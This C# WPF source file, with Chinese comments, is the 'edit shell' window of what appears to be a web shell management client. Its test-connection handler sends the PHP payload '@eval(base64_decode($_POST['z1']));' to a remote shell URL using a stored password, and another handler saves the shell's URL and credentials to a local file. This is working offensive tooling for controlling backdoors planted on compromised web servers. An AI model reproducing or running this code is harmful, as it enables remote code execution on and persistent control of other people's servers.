using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using System.IO;
using Newtonsoft.Json.Linq;
using WpfApp1.Utli;
using WpfApp1.Payload.php;

namespace WpfApp1.UI
{
    /// <summary>
    /// EditShell.xaml 的交互逻辑
    /// </summary>
    public partial class EditShell : Window
    {
        /// <summary>
        /// id
        /// </summary>
        public string _ID { get; set; }
        /// <summary>
        /// 连接shell 地址
        /// </summary>
        public string getUrl { get; set; }
        /// <summary>
        /// shell密码
        /// </summary>
        public string getPwd { get; set; }
        /// <summary>
        /// 脚本类型
        /// </summary>
        public string getScript { get; set; }
        /// <summary>
        /// 编码器
        /// </summary>
        public string getEncode { get; set; }
        /// <summary>
        /// 分类
        /// </summary>
        public string getDef { get; set; }

        public EditShell()
        {
            InitializeComponent();
            
        }

        

        public string? Des { get; set; }

        /// <summary>
        /// 引入payload
        /// </summary>
        Controller payload = new Controller();

        /// <summary>
        /// 列表id
        /// </summary>
        public string? ID { get; set; }

        //生成随机数 从 1 开始
        number num = new number();



        /// <summary>
        /// 测试连接按钮 点击事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Button_Click(object sender, RoutedEventArgs e)
        {
          
            if (url.Text == String.Empty)
            {
                MessageBox.Show("连接地址不能为空！");
            }
            else if (Password.Text == String.Empty)
            {
                MessageBox.Show("连接密码不能为空！");
            }
            else if (def.Text == String.Empty)
            {
                MessageBox.Show("分类不能为空！");
            }
            else if (combox1.Text == String.Empty)
            {
                MessageBox.Show("编码不能为空！");
            }
            else if (combox2.Text == String.Empty)
            {
                MessageBox.Show("脚本类型不能为空！");
            }
            else
            {
                if (combox1.Text == "Base64加密")
                {
                    string z1 = "@eval(base64_decode($_POST['z1']));";
                    string info = payload.info();
                    string p = z1 + "&z1=" + info;
                    string rsults = Post.Postring(getUrl, new Dictionary<string, string> { { getPwd, p }, });

                    if (rsults == "1")
                    {
                        MessageBox.Show("连接成功！");
                    }
                    else
                    {
                        MessageBox.Show("连接失败！");
                    }
                }
                else
                {
                    MessageBox.Show("加密方式选择错误！");
                }
            }

        }
        /// <summary>
        /// 添加按钮 点击事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Button_Click_1(object sender, RoutedEventArgs e)
        {
            try
            {
                if (url.Text == String.Empty)
                {
                    MessageBox.Show("连接地址不能为空！");
                }
                else if (Password.Text == String.Empty)
                {
                    MessageBox.Show("连接密码不能为空！");
                }
                else if (def.Text == String.Empty)
                {
                    MessageBox.Show("分类不能为空！");
                }
                else if (combox1.Text == String.Empty)
                {
                    MessageBox.Show("编码不能为空！");
                }
                else if (combox2.Text == String.Empty)
                {
                    MessageBox.Show("脚本类型不能为空！");
                }
                else
                {
                    string Fopen = String.Format("{{\"ID\":\"{0}\",\"url\": \"{1}\",\"password\": \"{2}\",\"encode\": \"{3}\",\"script\":\"{4}\",\"defaults\":\"{5}\"}}", _ID, getUrl, getPwd, getEncode, getScript, getDef);
                    //await File.WriteAllTextAsync("WriteText.txt", Fopen);

                    File.AppendAllText(@"ant.txt", Fopen + Environment.NewLine);
                    MessageBox.Show("保存成功！");
                }



            }
            catch
            {
                MessageBox.Show("保存失败！");
            }
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            url.Text = getUrl;
            Password.Text = getPwd;
            def.Text = getDef;
            combox1.Text = getEncode;
            combox2.Text = getScript;
        }
    }
}
